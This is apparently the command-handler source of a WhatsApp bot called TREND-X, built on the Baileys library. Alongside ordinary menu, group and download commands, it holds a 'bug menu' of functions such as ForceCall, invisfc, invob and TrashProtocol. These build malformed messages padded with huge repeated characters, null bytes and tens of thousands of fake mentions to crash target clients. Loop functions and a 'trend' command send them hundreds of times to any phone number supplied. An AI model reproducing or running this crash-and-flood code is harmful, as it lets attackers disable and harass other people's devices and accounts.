require('../setting/config')
const fs = require('fs')
const axios = require('axios')
const googleTTS = require('google-tts-api')
const checkDiskSpace = require('check-disk-space');
const chalk = require("chalk")
const fetch = require("node-fetch")
const FormData = require('form-data')
const jimp = require("jimp")
const os = require('os')
const path = require('path')
const { handleMediaUpload } = require('./lib/catbox')
const { getDevice, useSingleFileAuthState } = require('@whiskeysockets/baileys')
const fsp = fs.promises;
const lolcatjs = require('lolcatjs')
const util = require("util")
const moment = require("moment-timezone")
const yts = require('yt-search')
const { spawn, exec, execSync } = require('child_process')
const { default: baileys, proto, jidNormalizedUser, generateWAMessage, generateWAMessageFromContent, getContentType, prepareWAMessageMedia } = require("@whiskeysockets/baileys")

// ================= SHORT SESSION ID SETUP (NO BASE64) ================= //
const SESSION_ID = process.env.SESSION_ID || "TREND-XMD~"

let creds
try {
    const rawData = SESSION_ID.replace("TREND-XMD~", "")
    creds = JSON.parse(rawData)   // directly parse JSON string
    console.log(chalk.green("✅ Short raw Session ID loaded successfully"))
} catch (e) {
    console.log(chalk.red("❌ Invalid SESSION_ID. Please generate a new one."))
    creds = {}
}

const authState = {
    creds,
    keys: {
        get: async () => ({}),
        set: async () => {}
    }
}

const saveState = async () => {
    // here you could update SESSION_ID if you want auto-save later
    console.log(chalk.yellow("⚡ Using Short Raw Session ID (TREND-XMD)"))
}
// ====================================================================== //

module.exports = conn = async (conn, m, chatUpdate, mek, store) => {
try {
const body = (m.mtype === "conversation" ? m.message.conversation : m.mtype === "imageMessage" ? m.message.imageMessage.caption : m.mtype === "videoMessage" ? m.message.videoMessage.caption : m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text : m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId : m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId : m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId : m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id : m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId : m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : "")
const budy = (typeof m.text === 'string' ? m.text : '')
var textmessage = (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || budy) : ""
const content = JSON.stringify(mek.message)
const type = Object.keys(mek.message)[0]
if (m && type == "protocolMessage") conn.ev.emit("message.delete", m.message.protocolMessage.key)
const { sender } = m;
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us")
//database 
const kontributor = JSON.parse(fs.readFileSync('./start/lib/database/owner.json'))
const botNumber = await conn.decodeJid(conn.user.id)
const Access = [global.owner, ...kontributor, ...global.owner]
  .map(v => {
    // Convert to string if not already a string
    const str = typeof v === 'string' ? v : String(v);
    return str.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  })
  .includes(m.sender) ? true : m.isChecking ? true : false;
const prefa = ["", "!", ".", ",", "🐤", "👐🏽"]
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^]/gi) : ''
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name";
const text = q = args.join(" ")
const fatkuns = m.quoted || m;
const quoted = fatkuns.mtype === 'buttonsMessage' ? fatkuns[Object.keys(fatkuns)[1]] : fatkuns.mtype === 'templateMessage' ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : fatkuns.mtype === 'product' ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m;
const qmsg = quoted.msg || quoted;
const mime = qmsg.mimetype || '';
const isImage = type === 'imageMessage';
const isVideo = type === 'videoMessage';
const isAudio = type === 'audioMessage';
const isMedia = /image|video|sticker|audio/.test(mime)
const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedTag = type === 'extendedTextMessage' && content.includes('mentionedJid')
const isQuotedReply = type === 'extendedTextMessage' && content.includes('Message')
const isQuotedText = type === 'extendedTextMessage' && content.includes('conversation')
const isQuotedViewOnce = type === 'extendedTextMessage' && content.includes('viewOnceMessageV2')
//group
const groupMetadata = isGroup ? await conn.groupMetadata(m.chat).catch(() => {}) : "";
const groupOwner = isGroup ? groupMetadata.owner : "";
const groupName = isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup ? participants.filter(v => v.admin !== null).map(v => v.id) : "";
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
//time
const time = moment().tz("Asia/Jakarta").format("HH:mm:ss")
let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:00") {
ucapanWaktu = "🌃𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐌𝐚𝐥𝐚𝐦"
} else if (time >= "15:00:00" && time < "19:00:00") {
ucapanWaktu = "🌄𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐨𝐫𝐞"
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "🏞️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐢𝐚𝐧𝐠"
} else if (time >= "06:00:00" && time < "11:00:00") {
ucapanWaktu = "🏙️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐏𝐚𝐠𝐢"
} else {
ucapanWaktu = "🌆𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐮𝐛𝐮𝐡"
}
const peler = fs.readFileSync('./start/lib/media/reboot.jpg')
const cina = fs.readFileSync('./start/lib/media/x.jpg')
function getRandomImage() {
const randomIndex = Math.floor(Math.random() * cina.length)
return cina[randomIndex]
}
const cinahitam = getRandomImage()
async function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}
const Usage = prefix + command
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
//function
const { smsg, sendGmail, formatSize, isUrl, generateMessageTag, getBuffer, getSizeMedia, runtime, fetchJson, sleep, getRandom } = require('./lib/myfunction')
const { jadibot, stopjadibot, listjadibot } = require('./jadibot')
const reaction = async (jidss, emoji) => {
conn.sendMessage(jidss, { react: { text: emoji, key: m.key } })
}
if (m.message) {
if (isCmd && !m.isGroup) {
console.log(chalk.black(chalk.bgHex('#ff5e78').bold(`\n🦅 ${ucapanWaktu}🦅`)))
console.log(lolcatjs.fromString(`TREND-X`))
console.log(chalk.black(chalk.bgHex('#FF31FF15')(`
║➳ DATE: ${new Date().toLocaleString()}
║➳ MESSAGE: ${m.body || m.mtype}
║➳ SENDERNAME: ${pushname}
║➳ JIDS: ${m.sender}`
)
));
} else if (m.isGroup) {
console.log(chalk.black(chalk.bgHex('#ff5e78').bold(`\n🌟 ${ucapanWaktu} 🌟`)))
console.log(chalk.white(chalk.bgHex('#4a69bd').bold('TREND-X')))
console.log(chalk.black(chalk.bgHex('#FF31FF15')(`DATE: ${new Date().toLocaleString()}
║➳ Message: ${m.body || m.mtype}
║➳ Sendername: ${pushname}
║➳ Jids: ${m.sender}
║➳ From: ${groupName}`
))
);
}
}
if (autoread) {
            conn.readMessages([m.key])
        }
        
        if (global.autoTyping) {
        conn.sendPresenceUpdate('composing', from)
        }

        if (global.autoRecording) {
        conn.sendPresenceUpdate('recording', from)
        }
        conn.sendPresenceUpdate('uavailable', from)
                if (autobio) {
            conn.updateProfileStatus(`24/7 TREND-𝗫 𝗼𝗻𝗹𝗶𝗻𝗲 𝗽𝗼𝘄𝗲𝗿𝗲𝗱 𝗯𝘆 ༒TREND 𝘁𝗲𝗰𝗵༒`).catch(_ => _)
        }
let resize = async (image, width, height) => {
let oyy = await jimp.read(image)
let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
return kiyomasa
}
const reply = (teks) => {
            conn.sendMessage(m.chat, {
                text: teks,
                contextInfo: {
                    mentionedJid: [sender],
                    externalAdReply: {
                        title: "" ,
                        body: `${pushname}`,
                        thumbnail: peler,
                        sourceUrl: '',
                        renderLargerThumbnail: false,
                    }
                }
            }, { quoted: m })
        }
const buggy = `༒TREND 𝗧𝗘𝗖𝗛༒\n\n𝖣𝖾𝗅𝗂𝗏𝖾𝗋𝗂𝗇𝗀 𝗍𝗈 ${q}\n 𝖲𝖾𝗇𝖽𝖾𝗋: ${pushname} \n𝖢𝗈𝗆𝗆𝖺𝗇𝖽:${command}`
async function thumb(){
conn.sendMessage(m.chat, {  
            image: { url: "https://files.catbox.moe/adymbp.jpg" },  
            caption:buggy,   
            contextInfo: {
                mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterName: "༒TREND 𝗧𝗘𝗖𝗛༒",
                    newsletterJid: `120363401765045963@newsletter` 
                },
                
            }
        },{ quoted: st })
        }
async function bugLoad () {
var Lbugs = [
"𝕾𝖊",
"𝖓𝖉",
"𝖎𝖓𝖌",
"𝖇𝖚",
"𝖌𝖘",
"𝕾𝖊𝖓𝖉𝖎𝖓𝖌 𝖇𝖚𝖌𝖘.."
]
let { key } = await conn.sendMessage(from, {text: '𝐋𝐨𝐚𝐝𝐢𝐧𝐠'})

for (let i = 0; i < Lbugs.length; i++) {
await  conn.sendMessage(from, {text: Lbugs[i], edit: key });
}
}
async function doneLoad () {
var Sbugs = [
"𝕾𝖚𝖈𝖈",
"𝖊𝖘𝖘",
"𝖘𝖊𝖓𝖉",
"𝖉𝖎𝖓𝖌",
"𝖇𝖚𝖌𝖘",
"𝕾𝖚𝖈𝖈𝖊𝖘𝖘 𝖘𝖊𝖓𝖉𝖎𝖓𝖌 𝖇𝖚𝖌𝖘..."
]
let { key } = await conn.sendMessage(from, {text: '𝐋𝐨𝐚𝐝𝐢𝐧𝐠'})

for (let i = 0; i < Sbugs.length; i++) {
await  conn.sendMessage(from, {text: Sbugs[i], edit: key });
}
}
const st = {
  key: {
    fromMe: false,
    participant: "13135550002@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      
      itemCount: "4444",
      status: "INQUIRY",
      surface: "CATALOG",
      message: `Sender : @${m.sender.split('@')[0]}\nCommand : ${command}`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["1203633695141052429@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}
async function ForceCall(target) {
let InJectXploit = JSON.stringify({
status: true,
criador: "TheXtordcv",
resultado: {
type: "md",
ws: {
_events: {
"CB:ib,,dirty": ["Array"]
},
_eventsCount: 800000,
_maxListeners: 0,
url: "wss://web.whatsapp.com/ws/chat",
config: {
version: ["Array"],
browser: ["Array"],
waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
sockCectTimeoutMs: 20000,
keepAliveIntervalMs: 30000,
logger: {},
printQRInTerminal: false,
emitOwnEvents: true,
defaultQueryTimeoutMs: 60000,
customUploadHosts: [],
retryRequestDelayMs: 250,
maxMsgRetryCount: 5,
fireInitQueries: true,
auth: {
Object: "authData"
},
markOnlineOnsockCect: true,
syncFullHistory: true,
linkPreviewImageThumbnailWidth: 192,
transactionOpts: {
Object: "transactionOptsData"
},
generateHighQualityLinkPreview: false,
options: {},
appStateMacVerification: {
Object: "appStateMacData"
},
mobile: true
}
}
}
});
let msg = await generateWAMessageFromContent(
target, {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
title: "",
hasMediaAttachment: false,
},
body: {
text: "⩟⬦𪲁 𝐑‌‌𝐈𝐙‌𝐗𝐕‌𝐄𝐋𝐙‌‌‌‌‌𝐗‌‌𝐒 - 𝚵𝚳𝚸𝚬𝚪𝚯𝐑",
},
nativeFlowMessage: {
messageParamsJson: "{".repeat(10000),
buttons: [{
name: "single_select",
buttonParamsJson: InJectXploit,
},
{
name: "call_permission_request",
buttonParamsJson: InJectXploit + "{",
},
],
},
},
},
},
}, {}
);

await conn.relayMessage(target, msg.message, {
messageId: msg.key.id,
participant: {
jid: target
},
});
}

async function RB(target) {
  try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "𝕶𝖓𝖔𝖝𝖋𝖆𝖒𝖎𝖑𝖞",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.035,
                degreesLongitude: 922.999999999999,
                name: "\u200F",
                address: "\u200D",
              },
            },
            body: {
              text: "༒TREND 𝗧𝗘𝗖𝗛༒",
            },
            nativeFlowMessage: {
              messageParamsJson: "\n".repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 30000,
                  },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    };

    await conn.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
  console.log(chalk.yellow.bold("Sent Bugs"))
}
async function Crx(target) {
    await conn.relayMessage(number, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "@𝗱𝗲𝘃𝗼𝗿𝘀𝗶𝘅 • #𝘀𝗵𝗼𝘄𝗼𝗳𝗯𝘂𝗴 🩸",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1000000),
                        version: 3
                    }
                }
            }
        }
    }, { participant: { jid: target}});
}
async function invisfc(target, mention) {
            let msg = await generateWAMessageFromContent(target, {
                buttonsMessage: {
                    text: "🩸",
                    contentText:
                        "༒TREND 𝗧𝗘𝗖𝗛༒",
                    footerText: "",
                    buttons: [
                        {
                            buttonId: ".bugs",
                            buttonText: {
                                displayText: "🇷🇺" + "\u0000".repeat(800000),
                            },
                            type: 1,
                        },
                    ],
                    headerType: 1,
                },
            }, {});
        
            await conn.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
            if (mention) {
                await conn.relayMessage(
                    target,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: { is_status_mention: "༒𝗞𝗘𝗩𝗜𝗡 𝗧𝗘𝗖𝗛༒" },
                                content: undefined,
                            },
                        ],
                    }
                );
            }
        }
async function invob(target) {
    let message = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 3,
                },
                interactiveMessage: {
                    contextInfo: {
                        mentionedJid: [target],
                        isForwarded: true,
                        forwardingScore: 99999999,
                        businessMessageForwardInfo: {
                            businessOwnerJid: target,
                        },
                    },
                    body: {
                        text: "༒TREND 𝘁𝗲𝗰𝗵༒" + "꧀".repeat(100000),
                    },
                    nativeFlowMessage: {
                        buttons: [{
                                name: "single_select",
                                buttonParamsJson: "",
                            },
                            {
                                name: "call_permission_request",
                                buttonParamsJson: "",
                            },
                            {
                                name: "mpm",
                                buttonParamsJson: "",
                            },
                        ],
                    },
                },
            },
        },
    };

    await conn.relayMessage(target, message, {
        participant: {
            jid: target
        },
    });
    console.log(chalk.yellow('SENT BUGS🦠'));
}
async function TrashProtocol(target, mention) {
                const sex = Array.from({ length: 9741 }, (_, r) => ({
                       title: "꧀".repeat(9741),
                           rows: [`{ title: ${r + 1}, id: ${r + 1} }`]
                             }));
                             
                             const MSG = {
                             viewOnceMessage: {
                             message: {
                             listResponseMessage: {
                             title: "༒TREND 𝗧𝗘𝗖𝗛༒",
                             listType: 2,
                             buttonText: null,
                             sections: sex,
                             singleSelectReply: { selectedRowId: "🇷🇺" },
                             contextInfo: {
                             mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                             participant: target,
                             remoteJid: "status@broadcast",
                             forwardingScore: 9741,
                             isForwarded: true,
                             forwardedNewsletterMessageInfo: {
                             newsletterJid: "9741@newsletter",
                             serverMessageId: 1,
                             newsletterName: "-"
                             }
                             },
                             description: "🇷🇺"
                             }
                             }
                             },
                             contextInfo: {
                             channelMessage: true,
                             statusAttributionType: 2
                             }
                             };

                             const msg = generateWAMessageFromContent(target, MSG, {});

                             await conn.relayMessage("status@broadcast", msg.message, {
                             messageId: msg.key.id,
                             statusJidList: [target],
                             additionalNodes: [
                             {
                             tag: "meta",
                             attrs: {},
                             content: [
                             {
                             tag: "mentioned_users",
                             attrs: {},
                             content: [
                             {
                             tag: "to",
                             attrs: { jid: target },
                             content: undefined
                             }
                             ]
                             }
                             ]
                             }
                             ]
                             });

                             if (mention) {
                             await conn.relayMessage(
                             target,
                             {
                             statusMentionMessage: {
                             message: {
                             protocolMessage: {
                             key: msg.key,
                             type: 25
                             }
                             }
                             }
                             },
                             {
                additionalNodes: [
                    {
                       tag: "meta",
                           attrs: { is_status_mention: "༒TREND 𝗧𝗘𝗖𝗛༒" },
                             content: undefined
}
]
}
);
}
}

async function delayUI(durationHours, target) { 
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); let count = 0;

const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending ${count} messages`);
        return;
    }

    try {
        if (count < 800) {
            await Promise.all([
            TrashProtocol(target, false),
            invob(target),
            invisfc(target, false)
            ]);
            console.log(chalk.red(`Sending ( Crash🦠) ${count}/800 to ${target}`));
            count++;
            setTimeout(sendNext, 100);
        } else {
            console.log(chalk.green(`✅ Success Sending 400 Messages to ${target}`));
            count = 0;
            console.log(chalk.red("➡️ Next 400 Messages"));
            setTimeout(sendNext, 100);
        }
    } catch (error) {
        console.error(`❌ Error saat mengirim: ${error.message}`);
        

        setTimeout(sendNext, 100);
    }
};

sendNext();

}
async function delayonly(durationHours, target) { 
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); let count = 0;

const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending ${count} messages`);
        return;
    }

    try {
        if (count < 800) {
            await Promise.all([
            TrashProtocol(target, false),
            invisfc(target, false)
            ]);
            console.log(chalk.red(`Sending ( Crash🦠) ${count}/800 to ${target}`));
            count++;
            setTimeout(sendNext, 100);
        } else {
            console.log(chalk.green(`✅ Success Sending 400 Messages to ${target}`));
            count = 0;
            console.log(chalk.red("➡️ Next 400 Messages"));
            setTimeout(sendNext, 100);
        }
    } catch (error) {
        console.error(`❌ Error saat mengirim: ${error.message}`);
        

        setTimeout(sendNext, 100);
    }
};

sendNext();

}
async function Trial(target) { 
  var messageContent = generateWAMessageFromContent(target, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            'title': '',
            'subtitle': " "
          },
          'body': {
            'text': "Kizzu Ryuichi"
          },
          'footer': {
            'text': 'xp'
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ \"display_text\" : \"Kizzu Ryuichiᬊᬁ\", \"url\" : \"\", \"merchant_url\" : \"\" }"
            }],
            'messageParamsJson': "{".repeat(1000000)
          }
        }
      }
    }
  }), {
    'userJid': target
  });
  await conn.relayMessage(target, messageContent.message, { 
    'participant': {
      'jid': target
    },
    'messageId': messageContent.key.id
  });
  console.log(chalk.blue.bold("Sending trial bug"))
}






switch (command) {
case 'menu':
case 'vinic': {
  // Define menu sections for organization
  const menuSections = {
    header: {
      title: '☘ TREND 𝗧𝗘𝗖𝗛 ☘',
      content: [
        `👤 ᴏᴡɴᴇʀ: ☘ ᴋᴇʟᴠɪɴ ᴛᴇᴄʜ ☘`,
        `👤 ᴜsᴇʀ: ${pushname || 'Unknown'}`,
        `🤖 ʙᴏᴛɴᴀᴍᴇ: trend x`,
        `🌍 ᴍᴏᴅᴇ: ${conn.public ? 'ᴘᴜʙʟɪᴄ' : 'ᴘʀɪᴠᴀᴛᴇ'}`,
        `🛠️ ᴘʀᴇғɪx: [ ${prefix} ]`,
        `📈 ᴄᴍᴅs: 100+`, // Replace with actual command count if available
        `🧪 ᴠᴇʀsɪᴏɴ: 1.0.0-beta`,
      ],
    },
    bug: {
      title: '> 𝗕𝗨𝗚 𝗠𝗘𝗡𝗨 ',
      commands: [
        '𝖨𝗇𝗏𝗂𝗌', '𝖷𝖼𝗋𝖺𝗌𝗁', '𝖢𝗋𝖺𝗌𝗁', '𝖣𝖾𝗅𝖺𝗒',
        '𝙲𝚛𝚊𝚡', '𝖣𝖾𝗅𝖺𝗒𝖼𝗈𝗆𝖻𝗈', '𝖣𝖺𝗋𝗄', '𝖣𝗂𝗆', 'trend-crash',
      ],
    },
    owner: {
      title: '> 𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨  ',
      commands: [
        '𝖠𝖽𝖽𝗉𝗋𝖾𝗆 <number>', '𝖣𝖾𝗅𝗉𝗋𝖾𝗆 <number>', '𝖯𝗎𝖻𝗅𝗂𝖼', 'private',
        '𝙸𝚍𝚌𝚑', '𝙲𝚛𝚎𝚊𝚝𝚎𝚌𝚑',
        'antidelete', 'delete', 'setpp', 'lastseen', 'groupid', 'reportbug',
        'listblocked', 'online', 'join', 'leave', 'setbio', 'reqeust', 'block', 'toviewonce', 'autoviewstatus', 'unblock', 'unblockall',
        'anticall', 'antibug', 'vv', 'idch','autorecording', 'autotyping', 'getpp',
      ],
    },
    group: {
      title: '> 𝗚𝗥𝗢𝗨𝗣 𝗠𝗘𝗡𝗨  ',
      commands: [
        '𝖧𝗂𝖽𝖾𝗍𝖺𝗀', '𝖪𝗂𝖼𝗄', '𝖱𝖾𝗌𝖾𝗍𝗅𝗂𝗇𝗄', 'linkgc', 'checkchan',
        'antilink', 'listonline', 'add', 'listactive', 'listinactive', 'close',
        'open', 'kick', 'closetime', 'disappear', 'opentime', 'poll', 'totalmembers', 'mediatag', 'getgrouppp', 'antilink', 'tagall', 'tagadmin', 'setgroupname', 'delgrouppp', 'invite', 'editinfo', 'promote', 'demote', 'setdisc', 
      ],
    },
    download: {
      title: '> 𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗 𝗠𝗘𝗡𝗨 ',
      commands: ['play', 'play2', 'song', 'gitclone', 'mediafire',  'ytmp4', 'apk',  'tiktok', 'tiktok2', 'facebook'],
    },
    convert: {
      title: '> 𝗖𝗢𝗡𝗩𝗘𝗥𝗧 𝗠𝗘𝗡𝗨 ',
      commands: ['toaudio', 'toimage', 'url', 'tovideo', 'sticker'],
    },
    cmdTool: {
      title: '> 𝗖𝗠𝗗 𝗧𝗢𝗢𝗟 𝗠𝗘𝗡𝗨 ',
      commands: ['ping', 'repo', 'botstatus', 'botinfo', 'sc', 'serverinfo', 'alive'],
    },
    other: {
      title: '> 𝗢𝗧𝗛𝗘𝗥 𝗠𝗘𝗡𝗨  ',
      commands: ['time', 'calculate', 'sticker', 'owner', 'dev', 'fliptext', 'say', 'getdevice', 'getabout', 'sswebtab'],
    },
    ephoto: {
      title: '> 𝗘𝗣𝗛𝗢𝗧𝗢𝟯𝟲𝟬 𝗠𝗔𝗞𝗘𝗥 ',
      commands: ['blackpinklogo', 'blackpinkstyle', 'glossysilver', 'glitchtext', 'flux', 'dragonball'],
    },
    search: {
      title: '> 𝗦𝗘𝗔𝗥𝗖𝗛 𝗠𝗘𝗡𝗨 ',
      commands: ['lyrics', 'chord', 'weather', 'movie', 'shazam'],
    },
    fun: {
      title: '> 𝗙𝗨𝗡 𝗠𝗘𝗡𝗨 ',
      commands: ['dare', 'Quotes', 'truth', 'compatibility', 'compliment', 'hack', 'jokes'],
    },
    religion: {
      title: '> 𝗥𝗘𝗟𝗜𝗚𝗜𝗢𝗡 𝗠𝗘𝗡𝗨 ',
      commands: ['Bible', 'Quran'],
    },
    };
  

  // Function to format the menu
  const formatMenu = () => {
    let menu = `╭═✦〔 🤖 TREND-X  〕✦═╮\n`;
    menu += menuSections.header.content.map(line => `│ ${line}`).join('\n') + '\n';
    menu += `╰═✦═════════════╯\n\n`;

    for (const section of Object.values(menuSections).slice(1)) {
      menu += `${section.title}\n`;
      menu += section.commands.map(cmd => `│ ✦ ${prefix}${cmd}`).join('\n') + '\n';
      menu += `╰─────────\n\n`;
    }
    menu += `> ᴘᴏᴡᴇʀᴇᴅ ʙʏ TRENDX ᴛᴇᴄʜ `;
    return menu;
  };

  try {
    // Send menu with image
    await conn.sendMessage(m.chat, {
      image: { url: 'https://files.catbox.moe/adymbp.jpg' },
      caption: formatMenu(),
      contextInfo: {
        mentionedJid: [m.sender],
        forwardedNewsletterMessageInfo: {
          newsletterName: '☘ TREND 𝗧𝗘𝗖𝗛 ☘',
          newsletterJid: '120363401765045963@newsletter',
        },
        isForwarded: true,
        externalAdReply: {
          showAdAttribution: true,
          title: global.botname || 'TREND-X',
          body: '☘ ᴋᴇʟᴠɪɴ ᴛᴇᴄʜ ☘',
          mediaType: 3,
          renderLargerThumbnail: false,
          thumbnail: cina, // Ensure 'cina' is defined or replace with valid thumbnail
          sourceUrl: 'https://whatsapp.com/channel/0029Vb6b7ZdF6sn4Vmjf2X1O',
        },
      },
    }, { quoted: m });

    // Send audio
    await conn.sendMessage(m.chat, {
      audio: { url: 'https://files.catbox.moe/jdozs7.mp3' },
      mimetype: 'audio/mpeg',
      ptt: true,
    }, { quoted: m });
  } catch (error) {
    console.error('Error sending menu:', error);
    await conn.sendMessage(m.chat, {
      text: '⚠️ Error displaying menu. Please try again!',
    }, { quoted: m });
  }
}
break;
case "delprem":{
  const prem = JSON.parse(fs.readFileSync("./start/lib/database/premium.json"))    
if (!Access) return reply(mess.owner)
if (!text) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 256xxx`)
let ya = q.replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync("./start/lib/database/owner.json", JSON.stringify(prem))
reply(`*Successfully deleted${ya}as a premium user*!`)
}
break
case "trend":{
if(!Access) return reply(mess.owner)
if(!text) return reply("*Example: .trend 2547...*")
target = q.replace(/[^0-9]/g,'') + "@s.whatsapp.net"
await bugLoad()
reply(`▬▭▬▭▬▭▬▭▬▭▬▭▬\n${buggy}\n▬▭▬▭▬▭▬▭▬▭▬▭▬`)
     
for(let i = 0; i < 40; i++){
await ForceCall(target)
await ForceCall(target)
await ForceCall(target)
await sleep(1500)
await ForceCall(target)
await ForceCall(target)
await sleep(1500)
await ForceCall(target)

}
}
case "addprem": {
    const prem = JSON.parse(fs.readFileSync("./start/lib/database/owner.json"))   
    if (!Access) return reply(mess.owner)
    if (!text) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 256xxxx`)
    
    // Clean and validate the number
    const phoneNumber = text.split("|")[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    
    // Check if already premium
    if (prem.includes(phoneNumber)) return reply(`*This number is already premium!*`)
    
    // Verify WhatsApp account
    const ceknya = await conn.onWhatsApp(phoneNumber)
    if (ceknya.length == 0) return reply(`*Enter a valid WhatsApp number!*`)
    
    // Add to premium list
    prem.push(phoneNumber)
    fs.writeFileSync("./start/lib/database/owner.json", JSON.stringify(prem))
    reply(`*Successfully added ${phoneNumber} to premium list!*`)
}
break
case 'cekidch': case 'idch': {
if (!text) return reply("*channel link*")
if (!text.includes("https://whatsapp.com/channel/")) return reply("*In valid link*")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await conn.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total followers :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "*Verified*" : "*No*"}
`
return reply(teks)
}
break
case 'createch': {
    if (!Access) return m.reply("*Owner command only*");
    let parts = text.split('|');
    let channelName = parts[0]?.trim();
    let channelDesc = parts[1]?.trim() || '';
    if (!channelName) {
        return m.reply(`Example: 
${prefix + command} *ChannelName|ChannelDesc*`)}
    try {
        const metadata = await conn.newsletterCreate(channelName, channelDesc);
        console.log(metadata);
        console.log('Channel metadata:', JSON.stringify(metadata, null, 2));
        let channelId;
        if (metadata && metadata.channelId) {
            channelId = metadata.channelId;
        } else if (metadata && metadata.id) {
            channelId = metadata.id;
        } else if (metadata && metadata.channel && metadata.channel.id) {
            channelId = metadata.channel.id;
        } else if (typeof metadata === 'string') {
            channelId = metadata;
        } else {
            const findId = (obj) => {
                if (!obj || typeof obj !== 'object') return null;
                for (const key in obj) {
                    if (key === 'id' || key === 'channelId' || key.toLowerCase().includes('id')) {
